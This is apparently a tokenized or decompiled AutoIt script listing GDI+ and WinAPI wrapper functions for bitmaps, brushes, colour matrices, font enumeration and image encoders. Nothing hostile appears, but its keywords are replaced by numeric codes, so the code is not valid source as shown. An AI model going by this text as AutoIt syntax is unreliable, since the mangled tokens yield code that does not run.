34$ARET[0]
33
32__ENUMDISPLAYMONITORSPROC($HMONITOR,$HDC,$PRECT,$LPARAM)
__INC($__G_VENUM)
$__G_VENUM[$__G_VENUM[0][0]][0]=$HMONITOR
43$PRECT5
$__G_VENUM[$__G_VENUM[0][0]][1]=0
6
$__G_VENUM[$__G_VENUM[0][0]][1]=65($TAGRECT)
43_WINAPI_MOVEMEMORY(67($__G_VENUM[$__G_VENUM[0][0]][1]),$PRECT,16)5340
8
341
33
32__ENUMFONTFAMILIESPROC($PELFEX,$PNTMEX,$IFONTTYPE,$PPATTERN)
28$TELFEX=65($TAGLOGFONT&";wchar FullName[64];wchar Style[32];wchar Script[32]",$PELFEX)
28$TNTMEX=65($TAGNEWTEXTMETRICEX,$PNTMEX)
28$TPATTERN=65("uint;uint;ptr",$PPATTERN)
4$IFONTTYPE1317($IFONTTYPE,66($TPATTERN,1))5
341
8
466($TPATTERN,3)5
28$ARET=58("shlwapi.dll","bool","PathMatchSpecW","ptr",67($TELFEX,14),"ptr",66($TPATTERN,3))
43@ERROR5
466($TPATTERN,2)5
4$ARET[0]5
341
6
8
6
4$ARET[0]5
6
341
8
8
8
8
__INC($__G_VENUM)
$__G_VENUM[$__G_VENUM[0][0]][0]=66($TELFEX,14)
$__G_VENUM[$__G_VENUM[0][0]][1]=66($TELFEX,16)
$__G_VENUM[$__G_VENUM[0][0]][2]=66($TELFEX,15)
$__G_VENUM[$__G_VENUM[0][0]][3]=66($TELFEX,17)
$__G_VENUM[$__G_VENUM[0][0]][4]=$IFONTTYPE
$__G_VENUM[$__G_VENUM[0][0]][5]=66($TNTMEX,19)
$__G_VENUM[$__G_VENUM[0][0]][6]=66($TNTMEX,20)
$__G_VENUM[$__G_VENUM[0][0]][7]=66($TNTMEX,21)
341
33
32__ENUMFONTSTYLESPROC($PELFEX,$PNTMEX,$IFONTTYPE,$PFN)
28$TELFEX=65($TAGLOGFONT&";wchar FullName[64];wchar Style[32];wchar Script[32]",$PELFEX)
28$TNTMEX=65($TAGNEWTEXTMETRICEX,$PNTMEX)
28$TFN=65("dword;wchar[64]",$PFN)
417(66($TNTMEX,"ntmFlags"),97)=66($TFN,1)5
69($TFN,2,66($TELFEX,"FullName"))
340
6
341
8
33
29$__G_HGDIPBRUSH=0
29$__G_HGDIPDLL=0
29$__G_HGDIPPEN=0
29$__G_IGDIPREF=0
29$__G_IGDIPTOKEN=0
29$__G_BGDIP_V1_0=39
32_GDIPLUS_ARROWCAPCREATE($FHEIGHT,$FWIDTH,$BFILLED=39)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateAdjustableArrowCap","float",$FHEIGHT,"float",$FWIDTH,"bool",$BFILLED,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[4]
33
32_GDIPLUS_ARROWCAPDISPOSE($HCAP)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDeleteCustomLineCap","handle",$HCAP)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_ARROWCAPGETFILLSTATE($HARROWCAP)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetAdjustableArrowCapFillState","handle",$HARROWCAP,"bool*",0)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_ARROWCAPGETHEIGHT($HARROWCAP)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetAdjustableArrowCapHeight","handle",$HARROWCAP,"float*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_ARROWCAPGETMIDDLEINSET($HARROWCAP)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetAdjustableArrowCapMiddleInset","handle",$HARROWCAP,"float*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_ARROWCAPGETWIDTH($HARROWCAP)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetAdjustableArrowCapWidth","handle",$HARROWCAP,"float*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_ARROWCAPSETFILLSTATE($HARROWCAP,$BFILLED=39)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetAdjustableArrowCapFillState","handle",$HARROWCAP,"bool",$BFILLED)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_ARROWCAPSETHEIGHT($HARROWCAP,$FHEIGHT)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetAdjustableArrowCapHeight","handle",$HARROWCAP,"float",$FHEIGHT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_ARROWCAPSETMIDDLEINSET($HARROWCAP,$FINSET)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetAdjustableArrowCapMiddleInset","handle",$HARROWCAP,"float",$FINSET)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_ARROWCAPSETWIDTH($HARROWCAP,$FWIDTH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetAdjustableArrowCapWidth","handle",$HARROWCAP,"float",$FWIDTH)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_BITMAPCLONEAREA($HBITMAP,$NLEFT,$NTOP,$NWIDTH,$NHEIGHT,$IFORMAT=137224)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCloneBitmapArea","float",$NLEFT,"float",$NTOP,"float",$NWIDTH,"float",$NHEIGHT,"int",$IFORMAT,"handle",$HBITMAP,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[7]
33
32_GDIPLUS_BITMAPCREATEDIBFROMBITMAP($HBITMAP)
28$ARET=58($__G_HGDIPDLL,"uint","GdipGetImageDimension","handle",$HBITMAP,"float*",0,"float*",0)
4@ERROR2$ARET[0]534287(@ERROR+10,$ARET[0],0)
28$TDATA=_GDIPLUS_BITMAPLOCKBITS($HBITMAP,0,0,$ARET[2],$ARET[3],$GDIP_ILMREAD,$GDIP_PXF32ARGB)
28$PBITS=66($TDATA,"Scan0")
43$PBITS5340
28$TBIHDR=65($TAGBITMAPV5HEADER)
69($TBIHDR,"bV5Size",68($TBIHDR))
69($TBIHDR,"bV5Width",$ARET[2])
69($TBIHDR,"bV5Height",$ARET[3])
69($TBIHDR,"bV5Planes",1)
69($TBIHDR,"bV5BitCount",32)
69($TBIHDR,"bV5Compression",0)
69($TBIHDR,"bV5SizeImage",$ARET[3]*66($TDATA,"Stride"))
69($TBIHDR,"bV5AlphaMask",-16777216)
69($TBIHDR,"bV5RedMask",16711680)
69($TBIHDR,"bV5GreenMask",65280)
69($TBIHDR,"bV5BlueMask",255)
69($TBIHDR,"bV5CSType",2)
69($TBIHDR,"bV5Intent",4)
28$HHBITMAPV5=58("gdi32.dll","ptr","CreateDIBSection","hwnd",0,"struct*",$TBIHDR,"uint",0,"ptr*",0,"ptr",0,"dword",0)
43@ERROR1$HHBITMAPV5[0]5
58("gdi32.dll","dword","SetBitmapBits","ptr",$HHBITMAPV5[0],"dword",$ARET[2]*$ARET[3]*4,"ptr",66($TDATA,"Scan0"))
$HHBITMAPV5=$HHBITMAPV5[0]
6
$HHBITMAPV5=0
8
_GDIPLUS_BITMAPUNLOCKBITS($HBITMAP,$TDATA)
$TDATA=0
$TBIHDR=0
34$HHBITMAPV5
33
32_GDIPLUS_BITMAPCREATEFROMFILE($SFILENAME)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateBitmapFromFile","wstr",$SFILENAME,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_BITMAPCREATEFROMGRAPHICS($IWIDTH,$IHEIGHT,$HGRAPHICS)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateBitmapFromGraphics","int",$IWIDTH,"int",$IHEIGHT,"handle",$HGRAPHICS,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[4]
33
32_GDIPLUS_BITMAPCREATEFROMHBITMAP($HBITMAP,$HPAL=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateBitmapFromHBITMAP","handle",$HBITMAP,"handle",$HPAL,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[3]
33
32_GDIPLUS_BITMAPCREATEFROMMEMORY($DIMAGE,$BHBITMAP=40)
43220($DIMAGE)534287(1,0,0)
28$ARESULT=0
2830$DMEMBITMAP=13($DIMAGE)
2830$ILEN=14($DMEMBITMAP)
2830$GMEM_MOVEABLE=2
$ARESULT=58("kernel32.dll","handle","GlobalAlloc","uint",$GMEM_MOVEABLE,"ulong_ptr",$ILEN)
4@ERROR534287(4,0,0)
2830$HDATA=$ARESULT[0]
$ARESULT=58("kernel32.dll","ptr","GlobalLock","handle",$HDATA)
4@ERROR534287(5,0,0)
28$TMEM=65("byte["&$ILEN&"]",$ARESULT[0])
69($TMEM,1,$DMEMBITMAP)
58("kernel32.dll","bool","GlobalUnlock","handle",$HDATA)
4@ERROR534287(6,0,0)
2830$HSTREAM=_WINAPI_CREATESTREAMONHGLOBAL($HDATA)
4@ERROR534287(2,0,0)
2830$HBITMAP=_GDIPLUS_BITMAPCREATEFROMSTREAM($HSTREAM)
4@ERROR534287(3,0,0)
58("oleaut32.dll","long","DispCallFunc","ptr",$HSTREAM,"ulong_ptr",8*(1+@AUTOITX64),"uint",4,"ushort",23,"uint",0,"ptr",0,"ptr",0,"str","")
4$BHBITMAP5
2830$HHBMP=_GDIPLUS_BITMAPCREATEDIBFROMBITMAP($HBITMAP)
_GDIPLUS_BITMAPDISPOSE($HBITMAP)
34$HHBMP
8
34$HBITMAP
33
32_GDIPLUS_BITMAPCREATEFROMRESOURCE($HINST,$VRESOURCENAME)
28$STYPE="int"
4233($VRESOURCENAME)5$STYPE="wstr"
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateBitmapFromResource","handle",$HINST,$STYPE,$VRESOURCENAME,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[3]
33
32_GDIPLUS_BITMAPCREATEFROMSCAN0($IWIDTH,$IHEIGHT,$IPIXELFORMAT=$GDIP_PXF32ARGB,$ISTRIDE=0,$PSCAN0=0)
28$ARESULT=58($__G_HGDIPDLL,"uint","GdipCreateBitmapFromScan0","int",$IWIDTH,"int",$IHEIGHT,"int",$ISTRIDE,"int",$IPIXELFORMAT,"struct*",$PSCAN0,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[6]
33
32_GDIPLUS_BITMAPCREATEFROMSTREAM($PSTREAM)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateBitmapFromStream","ptr",$PSTREAM,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_BITMAPCREATEHBITMAPFROMBITMAP($HBITMAP,$IARGB=-16777216)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateHBITMAPFromBitmap","handle",$HBITMAP,"handle*",0,"dword",$IARGB)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_BITMAPDISPOSE($HBITMAP)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDisposeImage","handle",$HBITMAP)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_BITMAPCREATEFROMHICON($HICON)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateBitmapFromHICON","handle",$HICON,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_BITMAPCREATEFROMHICON32($HICON)
28$TSIZE=_WINAPI_GETICONDIMENSION($HICON)
28$IWIDTH=66($TSIZE,"X")
28$IHEIGHT=66($TSIZE,"Y")
4$IWIDTH<=02$IHEIGHT<=0534287(10,-1,0)
28$TBITMAPINFO=65("dword Size;long Width;long Height;word Planes;word BitCount;dword Compression;dword SizeImage;long XPelsPerMeter;long YPelsPerMeter;dword ClrUsed;dword ClrImportant;dword RGBQuad")
69($TBITMAPINFO,"Size",68($TBITMAPINFO)-4)
69($TBITMAPINFO,"Width",$IWIDTH)
69($TBITMAPINFO,"Height",-$IHEIGHT)
69($TBITMAPINFO,"Planes",1)
69($TBITMAPINFO,"BitCount",32)
69($TBITMAPINFO,"Compression",0)
69($TBITMAPINFO,"SizeImage",0)
28$HDC=_WINAPI_CREATECOMPATIBLEDC(0)
28$PBITS
28$HBMP=_WINAPI_CREATEDIBSECTION(0,$TBITMAPINFO,0,$PBITS)
28$HORIG=_WINAPI_SELECTOBJECT($HDC,$HBMP)
_WINAPI_DRAWICONEX($HDC,0,0,$HICON,$IWIDTH,$IHEIGHT)
28$HBITMAPICON=_GDIPLUS_BITMAPCREATEFROMSCAN0($IWIDTH,$IHEIGHT,$GDIP_PXF32ARGB,$IWIDTH*4,$PBITS)
28$HBITMAP=_GDIPLUS_BITMAPCREATEFROMSCAN0($IWIDTH,$IHEIGHT)
28$HCONTEXT=_GDIPLUS_IMAGEGETGRAPHICSCONTEXT($HBITMAP)
_GDIPLUS_GRAPHICSDRAWIMAGE($HCONTEXT,$HBITMAPICON,0,0)
_GDIPLUS_GRAPHICSDISPOSE($HCONTEXT)
_GDIPLUS_BITMAPDISPOSE($HBITMAPICON)
_WINAPI_SELECTOBJECT($HDC,$HORIG)
_WINAPI_DELETEDC($HDC)
_WINAPI_DELETEOBJECT($HBMP)
34$HBITMAP
33
32_GDIPLUS_BITMAPGETPIXEL($HBITMAP,$IX,$IY)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipBitmapGetPixel","handle",$HBITMAP,"int",$IX,"int",$IY,"uint*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[4]
33
32_GDIPLUS_BITMAPLOCKBITS($HBITMAP,$ILEFT,$ITOP,$IWIDTH,$IHEIGHT,$IFLAGS=$GDIP_ILMREAD,$IFORMAT=$GDIP_PXF32RGB)
28$TDATA=65($TAGGDIPBITMAPDATA)
28$TRECT=65($TAGRECT)
69($TRECT,"Left",$ILEFT)
69($TRECT,"Top",$ITOP)
69($TRECT,"Right",$IWIDTH)
69($TRECT,"Bottom",$IHEIGHT)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipBitmapLockBits","handle",$HBITMAP,"struct*",$TRECT,"uint",$IFLAGS,"int",$IFORMAT,"struct*",$TDATA)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$TDATA
33
32_GDIPLUS_BITMAPSETPIXEL($HBITMAP,$IX,$IY,$IARGB)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipBitmapSetPixel","handle",$HBITMAP,"int",$IX,"int",$IY,"uint",$IARGB)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_BITMAPSETRESOLUTION($HBITMAP,$FDPIX,$FDPIY)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipBitmapSetResolution","handle",$HBITMAP,"float",$FDPIX,"float",$FDPIY)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_BITMAPUNLOCKBITS($HBITMAP,$TBITMAPDATA)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipBitmapUnlockBits","handle",$HBITMAP,"struct*",$TBITMAPDATA)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_BRUSHCLONE($HBRUSH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCloneBrush","handle",$HBRUSH,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_BRUSHCREATESOLID($IARGB=-16777216)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateSolidFill","int",$IARGB,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_BRUSHDISPOSE($HBRUSH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDeleteBrush","handle",$HBRUSH)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_BRUSHGETSOLIDCOLOR($HBRUSH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetSolidFillColor","handle",$HBRUSH,"dword*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_BRUSHGETTYPE($HBRUSH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetBrushType","handle",$HBRUSH,"int*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_BRUSHSETSOLIDCOLOR($HBRUSH,$IARGB=-16777216)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetSolidFillColor","handle",$HBRUSH,"dword",$IARGB)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_COLORMATRIXCREATE()
34_GDIPLUS_COLORMATRIXCREATESCALE(1,1,1,1)
33
32_GDIPLUS_COLORMATRIXCREATEGRAYSCALE()
28$II,$IJ,$TCM,$ALUMS[4]=[$GDIP_RLUM,$GDIP_GLUM,$GDIP_BLUM,0]
$TCM=65($TAGGDIPCOLORMATRIX)
13$II=0153
13$IJ=1153
69($TCM,"m",$ALUMS[$II],$II*5+$IJ)
14
14
69($TCM,"m",1,19)
69($TCM,"m",1,25)
34$TCM
33
32_GDIPLUS_COLORMATRIXCREATENEGATIVE()
28$II,$TCM
$TCM=_GDIPLUS_COLORMATRIXCREATESCALE(-1,-1,-1,1)
13$II=1154
69($TCM,"m",1,20+$II)
14
34$TCM
33
32_GDIPLUS_COLORMATRIXCREATESATURATION($FSAT)
28$FSATCOMP,$TCM
$TCM=65($TAGGDIPCOLORMATRIX)
$FSATCOMP=(1-$FSAT)
69($TCM,"m",$FSATCOMP*$GDIP_RLUM+$FSAT,1)
69($TCM,"m",$FSATCOMP*$GDIP_RLUM,2)
69($TCM,"m",$FSATCOMP*$GDIP_RLUM,3)
69($TCM,"m",$FSATCOMP*$GDIP_GLUM,6)
69($TCM,"m",$FSATCOMP*$GDIP_GLUM+$FSAT,7)
69($TCM,"m",$FSATCOMP*$GDIP_GLUM,8)
69($TCM,"m",$FSATCOMP*$GDIP_BLUM,11)
69($TCM,"m",$FSATCOMP*$GDIP_BLUM,12)
69($TCM,"m",$FSATCOMP*$GDIP_BLUM+$FSAT,13)
69($TCM,"m",1,19)
69($TCM,"m",1,25)
34$TCM
33
32_GDIPLUS_COLORMATRIXCREATESCALE($FRED,$FGREEN,$FBLUE,$FALPHA=1)
28$TCM
$TCM=65($TAGGDIPCOLORMATRIX)
69($TCM,"m",$FRED,1)
69($TCM,"m",$FGREEN,7)
69($TCM,"m",$FBLUE,13)
69($TCM,"m",$FALPHA,19)
69($TCM,"m",1,25)
34$TCM
33
32_GDIPLUS_COLORMATRIXCREATETRANSLATE($FRED,$FGREEN,$FBLUE,$FALPHA=0)
28$II,$TCM,$AFACTORS[4]=[$FRED,$FGREEN,$FBLUE,$FALPHA]
$TCM=_GDIPLUS_COLORMATRIXCREATE()
13$II=0153
69($TCM,"m",$AFACTORS[$II],21+$II)
14
34$TCM
33
32_GDIPLUS_CUSTOMLINECAPCLONE($HCUSTOMLINECAP)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCloneCustomLineCap","handle",$HCUSTOMLINECAP,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]5287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_CUSTOMLINECAPCREATE($HPATHFILL,$HPATHSTROKE,$ILINECAP=0,$NBASEINSET=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateCustomLineCap","handle",$HPATHFILL,"handle",$HPATHSTROKE,"int",$ILINECAP,"float",$NBASEINSET,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[5]
33
32_GDIPLUS_CUSTOMLINECAPDISPOSE($HCAP)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDeleteCustomLineCap","handle",$HCAP)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_CUSTOMLINECAPGETSTROKECAPS($HCUSTOMLINECAP)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetCustomLineCapStrokeCaps","hwnd",$HCUSTOMLINECAP,"ptr*",0,"ptr*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]5287(10,$ARESULT[0],0)
28$ACAPS[2]
$ACAPS[0]=$ARESULT[2]
$ACAPS[1]=$ARESULT[3]
34$ACAPS
33
32_GDIPLUS_CUSTOMLINECAPSETSTROKECAPS($HCUSTOMLINECAP,$ISTARTCAP,$IENDCAP)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetCustomLineCapStrokeCaps","handle",$HCUSTOMLINECAP,"int",$ISTARTCAP,"int",$IENDCAP)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]5287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_DECODERS()
28$ICOUNT=_GDIPLUS_DECODERSGETCOUNT()
28$ISIZE=_GDIPLUS_DECODERSGETSIZE()
28$TBUFFER=65("byte["&$ISIZE&"]")
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetImageDecoders","uint",$ICOUNT,"uint",$ISIZE,"struct*",$TBUFFER)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
28$PBUFFER=67($TBUFFER)
28$TCODEC,$AINFO[$ICOUNT+1][14]
$AINFO[0][0]=$ICOUNT
13$II=115$ICOUNT
$TCODEC=65($TAGGDIPIMAGECODECINFO,$PBUFFER)
$AINFO[$II][1]=_WINAPI_STRINGFROMGUID(67($TCODEC,"CLSID"))
$AINFO[$II][2]=_WINAPI_STRINGFROMGUID(67($TCODEC,"FormatID"))
$AINFO[$II][3]=_WINAPI_WIDECHARTOMULTIBYTE(66($TCODEC,"CodecName"))
$AINFO[$II][4]=_WINAPI_WIDECHARTOMULTIBYTE(66($TCODEC,"DllName"))
$AINFO[$II][5]=_WINAPI_WIDECHARTOMULTIBYTE(66($TCODEC,"FormatDesc"))
$AINFO[$II][6]=_WINAPI_WIDECHARTOMULTIBYTE(66($TCODEC,"FileExt"))
$AINFO[$II][7]=_WINAPI_WIDECHARTOMULTIBYTE(66($TCODEC,"MimeType"))
$AINFO[$II][8]=66($TCODEC,"Flags")
$AINFO[$II][9]=66($TCODEC,"Version")
$AINFO[$II][10]=66($TCODEC,"SigCount")
$AINFO[$II][11]=66($TCODEC,"SigSize")
$AINFO[$II][12]=66($TCODEC,"SigPattern")
$AINFO[$II][13]=66($TCODEC,"SigMask")
$PBUFFER+=68($TCODEC)
14
34$AINFO
33
32_GDIPLUS_DECODERSGETCOUNT()
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetImageDecodersSize","uint*",0,"uint*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[1]
33
32_GDIPLUS_DECODERSGETSIZE()
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetImageDecodersSize","uint*",0,"uint*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_DRAWIMAGEPOINTS($HGRAPHIC,$HIMAGE,$NULX,$NULY,$NURX,$NURY,$NLLX,$NLLY,$ICOUNT=3)
28$TPOINT=65("float X;float Y;float X2;float Y2;float X3;float Y3")
69($TPOINT,"X",$NULX)
69($TPOINT,"Y",$NULY)
69($TPOINT,"X2",$NURX)
69($TPOINT,"Y2",$NURY)
69($TPOINT,"X3",$NLLX)
69($TPOINT,"Y3",$NLLY)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDrawImagePoints","handle",$HGRAPHIC,"handle",$HIMAGE,"struct*",$TPOINT,"int",$ICOUNT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_ENCODERS()
28$ICOUNT=_GDIPLUS_ENCODERSGETCOUNT()
28$ISIZE=_GDIPLUS_ENCODERSGETSIZE()
28$TBUFFER=65("byte["&$ISIZE&"]")
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetImageEncoders","uint",$ICOUNT,"uint",$ISIZE,"struct*",$TBUFFER)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
28$PBUFFER=67($TBUFFER)
28$TCODEC,$AINFO[$ICOUNT+1][14]
$AINFO[0][0]=$ICOUNT
13$II=115$ICOUNT
$TCODEC=65($TAGGDIPIMAGECODECINFO,$PBUFFER)
$AINFO[$II][1]=_WINAPI_STRINGFROMGUID(67($TCODEC,"CLSID"))
$AINFO[$II][2]=_WINAPI_STRINGFROMGUID(67($TCODEC,"FormatID"))
$AINFO[$II][3]=_WINAPI_WIDECHARTOMULTIBYTE(66($TCODEC,"CodecName"))
$AINFO[$II][4]=_WINAPI_WIDECHARTOMULTIBYTE(66($TCODEC,"DllName"))
$AINFO[$II][5]=_WINAPI_WIDECHARTOMULTIBYTE(66($TCODEC,"FormatDesc"))
$AINFO[$II][6]=_WINAPI_WIDECHARTOMULTIBYTE(66($TCODEC,"FileExt"))
$AINFO[$II][7]=_WINAPI_WIDECHARTOMULTIBYTE(66($TCODEC,"MimeType"))
$AINFO[$II][8]=66($TCODEC,"Flags")
$AINFO[$II][9]=66($TCODEC,"Version")
$AINFO[$II][10]=66($TCODEC,"SigCount")
$AINFO[$II][11]=66($TCODEC,"SigSize")
$AINFO[$II][12]=66($TCODEC,"SigPattern")
$AINFO[$II][13]=66($TCODEC,"SigMask")
$PBUFFER+=68($TCODEC)
14
34$AINFO
33
32_GDIPLUS_ENCODERSGETCLSID($SFILEEXTENSION)
28$AENCODERS=_GDIPLUS_ENCODERS()
4@ERROR534287(@ERROR,0,"")
13$II=115$AENCODERS[0][0]
4311($AENCODERS[$II][6],"*."&$SFILEEXTENSION)>0534$AENCODERS[$II][1]
14
34287(-1,-1,"")
33
32_GDIPLUS_ENCODERSGETCOUNT()
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetImageEncodersSize","uint*",0,"uint*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[1]
33
32_GDIPLUS_ENCODERSGETPARAMLIST($HIMAGE,$SENCODER)
28$ISIZE=_GDIPLUS_ENCODERSGETPARAMLISTSIZE($HIMAGE,$SENCODER)
4@ERROR534287(@ERROR+10,@EXTENDED,0)
28$TGUID=_WINAPI_GUIDFROMSTRING($SENCODER)
28$IREMAININGSIZE=$ISIZE-4-_GDIPLUS_PARAMSIZE()
28$TBUFFER
4$IREMAININGSIZE5
$TBUFFER=65("dword Count;"&$TAGGDIPENCODERPARAM&";byte ["&$IREMAININGSIZE&"]")
6
$TBUFFER=65("dword Count;"&$TAGGDIPENCODERPARAM)
8
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetEncoderParameterList","handle",$HIMAGE,"struct*",$TGUID,"uint",$ISIZE,"struct*",$TBUFFER)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$TBUFFER
33
32_GDIPLUS_ENCODERSGETPARAMLISTSIZE($HIMAGE,$SENCODER)
28$TGUID=_WINAPI_GUIDFROMSTRING($SENCODER)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetEncoderParameterListSize","handle",$HIMAGE,"struct*",$TGUID,"uint*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[3]
33
32_GDIPLUS_ENCODERSGETSIZE()
